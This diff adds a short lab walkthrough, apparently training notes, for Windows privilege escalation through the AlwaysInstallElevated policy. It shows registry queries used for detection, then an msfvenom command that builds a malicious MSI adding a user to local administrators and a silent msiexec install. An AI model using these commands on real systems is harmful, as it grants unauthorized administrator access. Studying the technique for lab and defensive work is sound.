@@ -1,0 +1,34 @@
+Detection - Windows VM (target)
+--------------------------------
+
+1. Run the command:
+
+	C:\Temp\accesschk> reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+
+	HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+	    AlwaysInstallElevated    REG_DWORD    0x1
+
+
+	C:\Temp\accesschk> reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+	HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+	    AlwaysInstallElevated    REG_DWORD    0x1
+
+
+2. Notice that “AlwaysInstallElevated” value is 1.
+
+
+
+Exploitation - Windows VM (target)
+-----------------------------------
+
+1. Create a malicious file named 'install.msi'
+
+	msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o install.msi
+
+2. Place install.msi in ‘C:\Temp’.
+
+3. Open command prompt and type: 
+	
+	msiexec /quiet /qn /i C:\Temp\install.msi
+
